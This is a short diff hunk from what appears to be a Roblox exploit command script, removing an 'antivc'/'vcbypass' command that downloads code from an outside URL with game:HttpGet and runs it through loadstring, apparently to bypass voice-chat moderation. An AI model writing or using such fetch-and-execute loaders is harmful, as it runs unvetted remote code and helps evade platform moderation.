@@ -4429,25 +4429,6 @@ add{
 	end,
 }
 add{
-    name = "antivc",
-	alias = { "antivcb", "vcbypass" }
-    group = "Other",
-    help = "Load the anti-VC script",
-    run = function()
-        if not loadstring then
-            return "loadstring is not available"
-        end
-        local ok, err = pcall(function()
-            loadstring(game:HttpGet("https://shield.xao.wtf/api/loader/550af30c-aaa3-4338-acab-f44010a5ef09"))()
-        end)
-        if not ok then
-            warn("[antivc] " .. tostring(err))
-            return "antivc failed - see console"
-        end
-        return "antivc loaded"
-    end,
-}
-add{
 	name = "rejoin",
 	group = "Other",
 	help = "Rejoin the same server",
